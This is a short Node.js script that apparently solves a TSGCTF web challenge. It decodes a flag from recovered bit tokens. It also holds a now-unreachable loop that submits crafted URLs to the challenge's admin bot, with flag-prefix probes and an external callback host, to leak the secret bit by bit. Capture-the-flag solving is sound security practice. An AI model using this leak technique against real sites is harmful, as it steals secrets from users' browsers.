const qs = require('querystring');
const axios = require('axios');

const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_'.split('');
chars.push('\\}');

const tokens = [
  '0-0',
  '0-2',
  '1-0',
  '1-4',
  '2-2',
  '3-0',
  '3-2',
  '3-4',
  '4-0',
  '4-2',
  '4-4',
  '5-2',
  '5-5',
  '6-5',
  '7-0',
  '7-1',
  '8-2',
  '8-5',
  '9-1',
  '9-2',
  '9-3',
  '10-0',
  '10-1',
  '10-2',
  '10-4',
  '11-2',
  '11-3',
  '12-0',
  '12-1',
  '12-3',
  '12-4',
  '13-1',
  '13-5',
  '14-0',
  '14-3',
  '14-4',
  '15-0',
  '15-1',
  '15-2',
  '16-0',
  '16-2',
  '16-5',
];

const flag = Array(20).fill(0);

for (const token of tokens) {
  const [pos, bit] = token.split('-').map((n) => parseInt(n));
  flag[pos] = flag[pos] | (1 << bit);
}
console.log(flag.map((f) => chars[f]).join(''));
process.exit();

(async () => {
  for (const c of Array(20).keys()) {
    const char = c + 0;
    for (const i of Array(6).keys()) {
      const vector = chars.filter((char, j) => ((j >> i) & 1) == 1).join('');
      const url = `http://hostname/?TSGCTF\\{${'.'.repeat(char)}[${vector}]#https://ssh.hakatashi.com:27797/?${Date.now()}-${char}-${i}`;
      console.log(url);
      const result = await axios.post('http://hostname/query', {url});
      console.log(result.data);
      await new Promise((resolve) => setTimeout(resolve, 1000));
    }
  }
})();